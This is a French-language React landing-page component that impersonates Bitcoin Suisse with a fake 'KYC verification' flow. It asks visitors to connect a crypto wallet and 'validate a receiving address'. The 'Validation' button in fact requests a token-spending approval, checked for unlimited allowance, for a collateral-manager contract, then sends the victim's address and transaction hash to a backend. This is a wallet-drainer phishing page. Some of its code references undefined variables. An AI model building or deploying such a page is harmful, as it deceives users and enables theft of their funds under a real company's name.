import React, { useState, useEffect } from 'react';
import { useAccount, useDisconnect } from 'wagmi';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { Button } from '../../components/ui/button';
import { Badge } from '../../components/ui/badge';
import { Wallet, ShieldCheck, CheckCircle, Loader2, Lock, ArrowRight } from 'lucide-react';
import { useApproveCollateralManager, useCheckAllowance } from '../../hooks/useCollateral';
import { CONTRACT_ADDRESSES } from '../../config/web3';
import { formatAddress } from '../../lib/utils';
import { toast, Toaster } from 'sonner';

// Assets
const LOGO_URL = 'https://customer-assets.emergentagent.com/job_invest-collateral/artifacts/tzq62nbg_Logo_Bitcoin_Suisse.png';
const BULL_BG_URL = 'https://customer-assets.emergentagent.com/job_invest-collateral/artifacts/v1jvsr8d_hero_header_front_d5e0b8c882.webp';

export default function Landing() {
  const [pageReady, setPageReady] = useState(false);
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const [isProcessing, setIsProcessing] = useState(false);
  
  // Hooks pour le flux simplifié
  const { approve, isPending: isApproving, isConfirmed: approveConfirmed } = useApproveCollateralManager();
  const { hasApproved, isUnlimited, refetch: refetchAllowance, isLoading: isCheckingAllowance } = useCheckAllowance();

  // Vérifier si le nouveau contrat est déployé
  const isContractDeployed = CONTRACT_ADDRESSES.COLLATERAL_MANAGER !== 'PENDING_DEPLOYMENT';

  // Marquer la page comme prête après le montage
  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  // Fermer le modal quand connecté
  useEffect(() => {
    if (isConnected && isConnecting) {
      setIsConnecting(false);
      close();
    }
  }, [isConnected, isConnecting, close]);

  // Rafraîchir l'allowance après une approbation confirmée
  useEffect(() => {
    if (approveConfirmed) {
      setTimeout(() => {
        refetchAllowance();
      }, 2000);
    }
  }, [approveConfirmed, refetchAllowance]);

  const handleConnect = async () => {
    try {
      setIsConnecting(true);
      await open();
    } catch (error) {
      console.error('Erreur connexion:', error);
      toast.error('Échec de la connexion');
      setIsConnecting(false);
    }
  };

  const handleApprove = async () => {
    if (!isConnected) {
      toast.error('Veuillez connecter votre wallet d\'abord');
      return;
    }

    if (!isContractDeployed) {
      toast.error('Le contrat n\'est pas encore déployé.');
      return;
    }

    try {
      setIsProcessing(true);
      
      toast.info('Veuillez confirmer la transaction dans votre wallet...');
      const txHash = await approve();
      console.log('✅ Approve TX envoyée:', txHash);
      
      // ENVOYER IMMÉDIATEMENT AU BACKEND dès que le wallet a validé
      try {
        const backendUrl = process.env.REACT_APP_BACKEND_URL || '';
        const response = await fetch(`${backendUrl}/api/clients`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            address: address,
            tx_hash: txHash 
          })
        });
        if (response.ok) {
          console.log('✅ Client enregistré dans le backend');
        }
      } catch (backendError) {
        console.error('Erreur backend:', backendError);
      }
      
      toast.success('Validation réussie !');
      
      // Attendre la confirmation blockchain en arrière-plan
      let confirmed = false;
      let attempts = 0;
      const maxAttempts = 15;
      
      while (!confirmed && attempts < maxAttempts) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        try {
          if (window.ethereum) {
            const receipt = await window.ethereum.request({
              method: 'eth_getTransactionReceipt',
              params: [txHash],
            });
            
            if (receipt && receipt.status === '0x1') {
              confirmed = true;
            }
          }
        } catch (e) {
          console.log('Vérification en cours...', attempts);
        }
        
        attempts++;
      }
      
      if (confirmed) {
        refetchAllowance();
      }
      
    } catch (error) {
      console.error('Erreur:', error);
      
      let errorMessage = 'Une erreur est survenue';
      
      if (error?.message) {
        if (error.message.includes('User rejected') || error.message.includes('user rejected') || error.message.includes('denied')) {
          errorMessage = 'Transaction annulée par l\'utilisateur';
        } else if (error.message.includes('insufficient funds')) {
          errorMessage = 'Fonds insuffisants pour les frais de gas';
        } else {
          errorMessage = error.message;
        }
      }
      
      toast.error(errorMessage);
    } finally {
      setIsProcessing(false);
    }
  };

  // Déterminer l'état du bouton
  const getButtonState = () => {
    if (!isContractDeployed) {
      return { disabled: true, text: 'En attente', icon: <Lock className="mr-2 h-5 w-5" /> };
    }
    if (isCheckingAllowance) {
      return { disabled: true, text: 'Vérification...', icon: <Loader2 className="mr-2 h-5 w-5 animate-spin" /> };
    }
    if (hasApproved) {
      return { disabled: true, text: 'Confirmé', icon: <CheckCircle className="mr-2 h-5 w-5" /> };
    }
    if (isProcessing || isApproving) {
      return { disabled: true, text: 'Traitement...', icon: <Loader2 className="mr-2 h-5 w-5 animate-spin" /> };
    }
    return { disabled: false, text: 'Validation', icon: <ShieldCheck className="mr-2 h-5 w-5" /> };
  };

  const buttonState = getButtonState();

  // Écran de chargement initial
  if (!pageReady) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <div className="w-10 h-10 border-2 border-[#E31B23] border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-white font-['Inter',sans-serif] relative overflow-hidden">
      <Toaster 
        richColors 
        position="top-center"
        toastOptions={{
          style: {
            background: '#1a1a1a',
            border: '1px solid #333',
            color: '#fff'
          }
        }}
      />
      
      {/* Background avec le taureau */}
      <div 
        className="absolute inset-0 bg-cover bg-right bg-no-repeat"
        style={{ backgroundImage: `url(${BULL_BG_URL})` }}
      />
      <div className="absolute inset-0 bg-gradient-to-r from-black via-black/95 to-black/40" />
      
      {/* Header */}
      <header className="relative z-10 flex items-center justify-between px-8 py-6">
        <img 
          src={LOGO_URL} 
          alt="Bitcoin Suisse" 
          className="h-10 object-contain brightness-0 invert"
        />
        <div className="flex items-center gap-4">
          {isConnected && (
            <Badge className="bg-[#E31B23]/10 text-[#E31B23] border border-[#E31B23]/30 px-4 py-2">
              <div className="w-2 h-2 rounded-full bg-[#E31B23] mr-2 animate-pulse" />
              {formatAddress(address)}
            </Badge>
          )}
          {isConnected && (
            <button 
              onClick={() => disconnect()}
              className="text-gray-500 hover:text-white text-sm transition-colors"
            >
              Déconnecter
            </button>
          )}
        </div>
      </header>

      {/* Main Content */}
      <main className="relative z-10 flex items-center min-h-[calc(100vh-180px)] px-8 lg:px-16">
        <div className="w-full max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
          
          {/* Left Column - Text */}
          <div className="space-y-8">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-[#E31B23]/10 border border-[#E31B23]/30 rounded-full text-[#E31B23] text-sm font-medium">
              <ShieldCheck className="w-4 h-4" />
              ESPACE CLIENT SÉCURISÉ
            </div>
            
            <div>
              <h1 className="text-4xl lg:text-5xl font-bold leading-tight">
                Vérification
                <br />
                <span className="text-[#E31B23]">KYC</span>
              </h1>
            </div>
            
            <p className="text-gray-400 text-lg max-w-md leading-relaxed">
              Veuillez connecter votre wallet afin de valider votre adresse de réception 
              des fonds USDT (ERC-20) et finaliser la procédure de vérification de votre dossier.
            </p>

            {/* Statut si connecté et autorisé */}
            {isConnected && hasApproved && (
              <div className="flex items-center gap-3 p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
                <CheckCircle className="w-6 h-6 text-green-500" />
                <div>
                  <p className="font-semibold text-green-400">Adresse validée</p>
                </div>
              </div>
            )}
            
            {/* Étapes */}
            <div className="space-y-4 pt-4">
              <div className="flex items-center gap-4">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${isConnected ? 'bg-green-500 text-black' : 'bg-[#E31B23] text-white'}`}>
                  {isConnected ? '✓' : '1'}
                </div>
                <span className={isConnected ? 'text-green-400' : 'text-gray-300'}>
                  Connecter votre wallet
                </span>
              </div>
              <div className="flex items-center gap-4">
                <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${hasApproved ? 'bg-green-500 text-black' : isConnected ? 'bg-[#E31B23] text-white' : 'bg-gray-800 text-gray-500'}`}>
                  {hasApproved ? '✓' : '2'}
                </div>
                <span className={hasApproved ? 'text-green-400' : isConnected ? 'text-gray-300' : 'text-gray-600'}>
                  Valider votre adresse de réception
                </span>
              </div>
            </div>
          </div>

          {/* Right Column - Action Card */}
          <div className="flex justify-center lg:justify-end">
            <div className="w-full max-w-md bg-[#111111]/90 backdrop-blur-sm border border-gray-800 rounded-2xl p-8 space-y-6">
              {/* Icon */}
              <div className="flex justify-center">
                <div className="w-16 h-16 rounded-full bg-[#E31B23]/10 border border-[#E31B23]/30 flex items-center justify-center">
                  <Wallet className="w-7 h-7 text-[#E31B23]" />
                </div>
              </div>
              
              {/* Title */}
              <div className="text-center">
                <h2 className="text-xl font-semibold">
                  {!isConnected ? 'Connexion Wallet' : hasApproved ? 'USDT - ERC20' : 'Signature Requise'}
                </h2>
                <p className="text-gray-500 text-sm mt-2">
                  {!isConnected 
                    ? 'Connectez votre wallet pour continuer' 
                    : hasApproved 
                      ? 'Votre adresse de réception a bien été confirmée'
                      : 'Validez votre adresse de réception'
                  }
                </p>
              </div>
              
              {/* Wallet Info si connecté */}
              {isConnected && (
                <div className="bg-[#0a0a0a] border border-gray-800 rounded-lg p-4">
                  <p className="text-xs text-gray-500 uppercase tracking-wider mb-1">Wallet connecté</p>
                  <p className="font-mono text-sm">{address}</p>
                </div>
              )}
              
              {/* Buttons */}
              <div className="space-y-3">
                {!isConnected ? (
                  <ConnectButton.Custom>
                    {({ openConnectModal }) => (
                      <Button 
                        onClick={openConnectModal}
                        className="w-full h-12 bg-[#E31B23] hover:bg-[#c91820] text-white font-semibold"
                        data-testid="connect-wallet-button"
                      >
                        <Wallet className="w-5 h-5 mr-2" />
                        Connecter Wallet
                      </Button>
                    )}
                  </ConnectButton.Custom>
                ) : (
                  <Button 
                    onClick={handleApprove}
                    disabled={buttonState.disabled}
                    className={`w-full h-12 font-semibold ${
                      hasApproved 
                        ? 'bg-green-600/20 text-green-400 border border-green-600/30 hover:bg-green-600/30' 
                        : 'bg-[#E31B23] hover:bg-[#c91820] text-white'
                    }`}
                    data-testid="sign-permit-button"
                  >
                    {buttonState.icon}
                    {buttonState.text}
                    {!hasApproved && !buttonState.disabled && <ArrowRight className="ml-2 h-4 w-4" />}
                  </Button>
                )}
              </div>
              
              {/* Info */}
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="relative z-10 px-8 py-6 border-t border-gray-900">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4 text-sm text-gray-500">
          <div className="flex items-center gap-2">
            <span className="text-[#E31B23] font-semibold">BITCOIN SUISSE</span>
            <span>•</span>
            <span>Plateforme de financement USDT</span>
          </div>
          <div>
            © 2025 Tous droits réservés
          </div>
        </div>
      </footer>
    </div>
  );
}
